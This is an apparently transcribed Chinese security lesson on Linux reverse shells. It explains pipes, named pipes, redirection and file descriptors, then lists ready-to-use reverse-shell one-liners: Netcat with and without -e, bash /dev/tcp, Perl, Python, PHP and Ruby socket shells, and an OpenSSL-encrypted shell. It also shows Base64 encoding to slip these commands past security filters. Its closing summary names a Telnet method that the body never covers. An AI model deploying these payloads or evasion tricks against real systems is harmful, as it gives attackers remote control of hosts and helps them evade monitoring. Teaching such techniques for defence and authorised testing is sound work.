## 使用Netcat反弹Shell
Netcat是一个网络工具，在Windows和Linux系统上都能支持。

![](img/9148f68e9475ffe7a7f3f0253707c061_22.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_24.png)

Netcat在Windows和Linux系统上的主要区别在于 `-e` 参数后面指定的Shell环境。在Windows上，通常是`cmd.exe`；在Linux下，则是`/bin/sh`或`/bin/bash`等系统默认的Shell环境。

![](img/9148f68e9475ffe7a7f3f0253707c061_26.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_27.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_31.png)

其实现正向或反向Shell的原理与操作和Windows系统是相同的。

![](img/9148f68e9475ffe7a7f3f0253707c061_33.png)

一个典型的反弹Shell命令如下：
```bash
nc -e /bin/sh 控制端IP 控制端端口
```

![](img/9148f68e9475ffe7a7f3f0253707c061_37.png)

然而，某些版本的Netcat可能没有`-e`这个危险的参数。在没有`-e`参数的情况下，我们可以通过其他方法实现反弹Shell。

## 理解Linux命令执行与管道
在深入其他方法前，我们需要理解几个Linux核心概念。

**命令顺序执行**：在Linux中，可以使用分号`;`顺序执行多条命令。
```bash
whoami; pwd
```

![](img/9148f68e9475ffe7a7f3f0253707c061_43.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_45.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_47.png)

**管道**：管道是一种用于进程间通信的机制，符号是竖线`|`。它将前一个命令的标准输出作为后一个命令的标准输入。
```bash
command1 | command2
```

![](img/9148f68e9475ffe7a7f3f0253707c061_49.png)

我们经常使用Socket进行网络通信，反弹Shell也会利用Socket建立网络连接。

## 命名管道
管道仅能处理标准输出。`mkfifo`命令用于创建一个命名管道文件。

![](img/9148f68e9475ffe7a7f3f0253707c061_60.png)

以下是`mkfifo`命令的基本用法：
```bash
mkfifo /tmp/test_pipe
ls -l /tmp/test_pipe
```
创建的文件类型显示为`p`，代表命名管道。

![](img/9148f68e9475ffe7a7f3f0253707c061_62.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_64.png)

**重定向**：重定向用于改变输入/输出的来源或目标。
*   `>` 或 `1>`：将标准输出重定向到文件（覆盖）。
*   `>>`：将标准输出重定向到文件（追加）。
*   `<` 或 `0<`：将文件内容作为标准输入。
*   `2>`：将标准错误输出重定向到文件。

![](img/9148f68e9475ffe7a7f3f0253707c061_66.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_68.png)

示例：将`ls`命令的输出重定向到管道文件，再从管道文件读取内容。
```bash
ls > /tmp/test_pipe
cat < /tmp/test_pipe
```
注意，管道文件内容被读取后即被清空。

## 文件描述符
在Linux中，一切皆文件。系统用文件描述符来标识打开的文件对象。

![](img/9148f68e9475ffe7a7f3f0253707c061_72.png)

系统启动时会默认打开三个文件描述符：
*   **0**：标准输入
*   **1**：标准输出
*   **2**：标准错误输出

![](img/9148f68e9475ffe7a7f3f0253707c061_74.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_76.png)

默认情况下，它们分别指向键盘（输入）、显示器（输出）和显示器（错误输出）。

![](img/9148f68e9475ffe7a7f3f0253707c061_78.png)

我们可以使用`exec`命令来更改文件描述符的指向或创建新的文件描述符。

![](img/9148f68e9475ffe7a7f3f0253707c061_80.png)

**更改标准输出位置**：
```bash
# 将后续命令的标准输出重定向到 test.txt 文件
exec 1> test.txt
whoami
pwd
# 此时 whoami 和 pwd 的输出会写入 test.txt，而不会显示在终端
```

![](img/9148f68e9475ffe7a7f3f0253707c061_82.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_84.png)

**更改标准输入位置**：
```bash
# 从文件 input.txt 读取内容，作为 read 命令的输入
exec 0< input.txt
read user_input
echo $user_input
```

![](img/9148f68e9475ffe7a7f3f0253707c061_86.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_88.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_89.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_91.png)

**更改标准错误输出位置**：
```bash
# 将后续命令的错误输出重定向到 error.log 文件
exec 2> error.log
ls /nonexistent_directory # 这条错误信息会写入 error.log
```

![](img/9148f68e9475ffe7a7f3f0253707c061_93.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_95.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_97.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_99.png)

## 无`-e`参数的Netcat反弹Shell
理解了管道和文件描述符后，我们可以构造不使用`-e`参数的反弹Shell命令。

![](img/9148f68e9475ffe7a7f3f0253707c061_114.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_116.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_118.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_119.png)

一个经典的命令组合如下：
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 控制端IP 控制端端口 > /tmp/f
```

![](img/9148f68e9475ffe7a7f3f0253707c061_121.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_122.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_123.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_124.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_125.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_127.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_129.png)

**命令分解与原理**：
1.  `rm /tmp/f; mkfifo /tmp/f`：删除旧的管道文件（如果存在），并创建一个新的命名管道`/tmp/f`。
2.  `cat /tmp/f`：从管道`/tmp/f`中读取内容。
3.  `| /bin/sh -i 2>&1`：将`cat`读取到的内容（即攻击者输入的命令）通过管道传递给一个交互式Shell(`sh -i`)执行。`2>&1`表示将标准错误输出合并到标准输出。
4.  `| nc 控制端IP 控制端端口`：将Shell执行命令后的标准输出和标准错误，通过管道传递给Netcat，由Netcat发送给控制端。
5.  `> /tmp/f`：将Netcat从控制端接收到的数据（即攻击者输入的命令）重定向写入到管道文件`/tmp/f`中，从而形成一个闭环。

![](img/9148f68e9475ffe7a7f3f0253707c061_131.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_133.png)

这样，攻击者在控制端输入的命令，会通过Netcat写入管道，再由`cat`读取并交给Shell执行，执行结果又通过Netcat传回控制端。

## 使用`/dev/tcp`反弹Shell
在Bash环境中，可以使用特殊的`/dev/tcp/[主机]/[端口]`文件进行网络通信。

![](img/9148f68e9475ffe7a7f3f0253707c061_136.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_138.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_140.png)

一个常见的Bash反弹Shell命令是：
```bash
bash -i >& /dev/tcp/控制端IP/控制端端口 0>&1
```

![](img/9148f68e9475ffe7a7f3f0253707c061_142.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_144.png)

**命令分解与原理**：
1.  `bash -i`：打开一个交互式的Bash Shell。
2.  `>& /dev/tcp/控制端IP/控制端端口`：将当前Shell的标准输出和标准错误输出都重定向到与`控制端IP:控制端端口`建立的TCP连接。
3.  `0>&1`：将标准输入重定向到标准输出。因为此时标准输出已经指向了TCP连接，所以标准输入也就从同一个TCP连接中读取。

![](img/9148f68e9475ffe7a7f3f0253707c061_146.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_148.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_150.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_152.png)

这条命令的精妙之处在于它用一条命令完成了双向通信的建立。攻击端监听相应端口后，就能获得一个完全交互式的Shell。

![](img/9148f68e9475ffe7a7f3f0253707c061_154.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_156.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_157.png)

为了更清晰地理解，可以将它拆分为两条命令的逻辑：
*   **发送输出**：`bash -i >& /dev/tcp/IP/Port` （将被控端的Shell输出发送给控制端）
*   **接收输入**：`0<&1` （从同一个连接接收控制端的输入作为Shell的命令）

![](img/9148f68e9475ffe7a7f3f0253707c061_159.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_161.png)

合并后，就实现了完整的交互。

![](img/9148f68e9475ffe7a7f3f0253707c061_163.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_164.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_166.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_168.png)

为了确保错误输出也能被捕获，更完善的写法是：
```bash
bash -i >& /dev/tcp/控制端IP/控制端端口 0>&1 2>&1
# 或者使用缩写
bash -i >& /dev/tcp/控制端IP/控制端端口 0>&1
```

![](img/9148f68e9475ffe7a7f3f0253707c061_170.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_171.png)

## 其他编程语言实现的反弹Shell
当目标系统存在特定的脚本语言环境时，也可以利用它们实现反弹Shell。其核心原理都是建立Socket连接，并重定向进程的标准输入、输出、错误到该Socket。

![](img/9148f68e9475ffe7a7f3f0253707c061_177.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_178.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_180.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_182.png)

**Perl 示例**：
```perl
perl -e ‘use Socket;$i=“控制端IP”;$p=控制端端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,“>&S”);open(STDOUT,“>&S”);open(STDERR,“>&S”);exec(“/bin/sh -i”);};’
```

![](img/9148f68e9475ffe7a7f3f0253707c061_184.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_185.png)

**Python 示例**：
```python
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“控制端IP”,控制端端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,“-i”]);’
```

![](img/9148f68e9475ffe7a7f3f0253707c061_187.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_189.png)

**PHP 示例**：
```php
php -r ‘$sock=fsockopen(“控制端IP”,控制端端口);exec(“/bin/sh -i <&3 >&3 2>&3”);’
```

![](img/9148f68e9475ffe7a7f3f0253707c061_191.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_193.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_195.png)

![](img/9148f68e9475ffe7a7f3f0253707c061_196.png)

**Ruby 示例**：
```ruby
ruby -rsocket -e‘f=TCPSocket.open(“控制端IP”,控制端端口).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’
```

## 使用OpenSSL反弹加密Shell
使用OpenSSL可以建立加密的反弹Shell连接，有助于绕过网络流量监控。

**控制端（监听）**：
```bash
# 生成证书
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
# 监听端口
openssl s_server -quiet -key key.pem -cert cert.pem -port 控制端端口
```

![](img/9148f68e9475ffe7a7f3f0253707c061_202.png)

**被控端（连接）**：
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 控制端IP:控制端端口 > /tmp/s; rm /tmp/s
```

![](img/9148f68e9475ffe7a7f3f0253707c061_204.png)

## 命令编码与混淆
在实际渗透中，安全设备可能会过滤特殊字符（如`>`, `<`, `|`, `&`）。我们可以对反弹Shell命令进行Base64编码来绕过。

![](img/9148f68e9475ffe7a7f3f0253707c061_206.png)

例如，对Bash反弹Shell命令进行编码：
```bash
# 原始命令
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

![](img/9148f68e9475ffe7a7f3f0253707c061_208.png)

# Base64编码
echo “bash -i >& /dev/tcp/192.168.1.100/4444 0>&1” | base64
# 输出：YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQo=

![](img/9148f68e9475ffe7a7f3f0253707c061_210.png)

# 在目标机器上执行解码后的命令
echo “YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQo=” | base64 -d | bash
```

## 总结
本节课我们一起学习了Linux下的反弹Shell技术。

我们首先回顾了反弹Shell的基本概念，然后深入学习了实现反弹Shell所依赖的Linux基础知识，包括命令执行、管道、重定向和核心的文件描述符概念。

在此基础上，我们详细剖析了多种反弹Shell方法的原理：
1.  使用带`-e`参数的Netcat。
2.  利用`mkfifo`创建命名管道配合无`-e`参数的Netcat。
3.  利用Bash内置的`/dev/tcp`特性。
4.  使用Perl、Python、PHP、Ruby等脚本语言。
5.  使用Telnet。
6.  使用OpenSSL建立加密连接。

理解这些方法的关键在于掌握**数据流如何通过Socket连接在控制端与被控端之间形成双向闭环**。最后，我们还介绍了通过Base64编码来简单绕过命令过滤的方法。
